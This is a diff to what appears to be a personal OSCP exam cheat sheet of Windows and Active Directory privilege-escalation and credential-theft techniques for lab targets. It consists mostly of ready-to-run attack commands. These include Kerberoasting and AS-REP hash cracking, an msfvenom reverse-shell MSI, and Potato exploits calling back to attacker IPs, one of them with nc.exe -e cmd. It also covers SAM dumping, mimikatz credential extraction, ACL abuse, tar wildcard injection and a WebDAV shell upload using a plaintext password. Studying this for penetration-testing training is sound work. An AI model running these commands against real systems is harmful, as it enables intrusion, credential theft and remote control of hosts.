@@ -4,9 +4,9 @@ draft = false
 title = 'OSCP_cheatsheet'
 +++
 
-# Kerberos
+## Kerberos
 
-## Kerberoasting (service account)
+### Kerberoasting (service account)
 
 - linux
 
@@ -23,7 +23,7 @@ hashcat:
 
 `hashcat -m 13100 hash.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.rule`
 
-## AS-REP Roasting (user account)
+### AS-REP Roasting (user account)
 
 - windows
 
@@ -41,11 +41,23 @@ hashcat:
 
 `hashcat -m 18200 hash.txt /path/to/wordlist`
 
-# Windows privileges
+## AlwaysInstallElevated
 
-## SeImpersonatePrivilege
+![msi](/images/alwayselevated.png)
 
-### potato
+- msi file executed as admin
+
+```sh
+msfvenom -p windows/x64/shell_reverse_tcp -f msi -o rev.msi LHOST=192.168.45.209 LPORT=8888
+```
+
+- move it to the target server and just run it.
+
+## Windows privileges
+
+### SeImpersonatePrivilege
+
+#### potato
 
 ```powershell
 .\SigmaPotato.exe --revshell 192.168.45.188 4444
@@ -59,7 +71,7 @@ hashcat:
 .\JuicyPotatoNG.exe -t * -p "c:\windows\system32\cmd.exe" -a "/c C:\users\chen\nc.exe 192.168.45.226 443 -e cmd"
 ```
 
-## SeBackupPrivilege
+### SeBackupPrivilege
 
 - copy SAM and SYSTEM files
 
@@ -88,7 +100,7 @@ Info: Download successful!
 impacket-secretsdump -system system -sam sam local                             
 ```
 
-## SeRestorePrivilege
+### SeRestorePrivilege
 
 https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/serestoreprivilege
 
@@ -101,13 +113,13 @@ ren C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
 rdesktop 192.168.134.165
 ```
 
-## SeManageVolumePrivilege
+### SeManageVolumePrivilege
 
 Execute the [tool](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----2ebc0077b961---------------------------------------)
 
-# GPO
+## GPO
 
-## ReadGMSAPassword
+### ReadGMSAPassword
 
 - target: svc_apache
 
@@ -115,7 +127,7 @@ Execute the [tool](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/
 gmsapasswordreader.exe --accountname svc_apache
 ```
 
-## GenericAll on Computer
+### GenericAll on Computer
 
 ![rbcd](/images/rbcd/genericall.png)
 
@@ -139,7 +151,7 @@ impacket-rbcd resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d
 [*]     fake$        (S-1-5-21-537427935-490066102-1511301751-4101)
 ```
 
-## WriteOwner
+### WriteOwner
 
 ![bloodhound](/images/vault/vault-bloodhound.png)
 
@@ -167,7 +179,7 @@ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'anirudh' -t
 gpupdate /force
 ```
 
-## AllExtendedRights
+### AllExtendedRights
 
 - import powerview
 
@@ -181,7 +193,7 @@ Import-Module .\PowerView.ps1
 Set-DomainUserPassword -Identity 'target_user' -Verbose
 ```
 
-# mimikatz
+## mimikatz
 
 ```cmd
 sekurlsa::logonpasswords
@@ -203,9 +215,9 @@ lsadump::secrets
 .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::wdigest" "exit"
 ```
 
-# wildcard injection
+## wildcard injection
 
-## tar
+### tar
 
 - create shell.sh file
 
@@ -221,7 +233,7 @@ touch -- "--checkpoint=1"
 touch -- "--checkpoint-action=exec=sh shell.sh"
 ```
 
-## 7za
+### 7za
 
 `7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log`
 
@@ -236,4 +248,60 @@ ln -s /root/proof.txt root.zip
 
 ```sh
 cat /opt/backups/backup.log 
+```
+
+## nxc
+
+### ldap
+
+- grep accounts
+
+```sh
+nxc ldap hutch.offsec -u '' -p '' --query "(sAMAccountName=*)" "" | grep sAMAccountName
+```
+
+- grep description
+
+```sh
+nxc ldap hutch.offsec -u '' -p '' --query "(sAMAccountName=*)" "" | grep description   
+```
+
+## webdav
+
+### davtest
+
+- find uploadable file type
+
+```sh
+davtest -auth fmcsorley:CrabSharkJellyfish192 -sendbd auto -url http://192.168.158.122
+
+PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.pl
+PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.html
+PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.php
+Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.txt
+Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.aspx
+Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.asp
+...
+```
+
+- upload a file
+
+```sh
+davtest -auth fmcsorley:CrabSharkJellyfish192 -uploadfile rev.aspx -uploadloc DavTestDir_LOqKQmYZCD2Fd -url http://192.168.158.122
+```
+
+## SSH
+
+### remote port forwarding (target -> kali)
+
+- forward port 80 and 14147
+
+```sh
+ssh -N -R 80:127.0.0.1:80 -R 14147:127.0.0.1:14147 kali@192.168.45.247
+```
+
+### local port forwarding (kali -> target)
+
+```sh
+ssh -N -L 8000:127.0.0.1:8000 dev@192.168.249.150
 ```
